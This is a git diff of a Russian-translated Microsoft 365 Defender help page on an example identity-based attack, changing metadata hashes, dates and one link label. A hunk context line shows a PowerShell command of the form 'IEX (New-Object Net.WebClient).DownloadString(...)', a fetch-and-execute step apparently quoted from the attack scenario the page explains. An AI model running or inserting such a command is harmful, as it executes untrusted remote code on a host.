@@ -22,12 +22,12 @@ search.appverid:
 - MOE150
 - MET150
 ms.technology: m365d
-ms.openlocfilehash: e56d6d5d78101da1f6da4c14ade25e80aa5b5063
-ms.sourcegitcommit: 05f40904f8278f53643efa76a907968b5c662d9a
+ms.openlocfilehash: c028289a58247075c33e85d6d6f3797b3ddad7b4
+ms.sourcegitcommit: de5fce90de22ba588e75e1a1d2e87e03b9e25ec7
 ms.translationtype: MT
 ms.contentlocale: ru-RU
-ms.lasthandoff: 04/30/2021
-ms.locfileid: "52114856"
+ms.lasthandoff: 05/10/2021
+ms.locfileid: "52297192"
 ---
 # <a name="example-of-an-identity-based-attack"></a>Пример атаки на основе удостоверений
 
@@ -95,4 +95,4 @@ IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com
 
 - [Обзор инцидентов](incidents-overview.md)
 - [Управление инцидентами](manage-incidents.md)
-- [Анализ инцидентов](investigate-incidents.md)
+- [Исследование инцидентов](investigate-incidents.md)
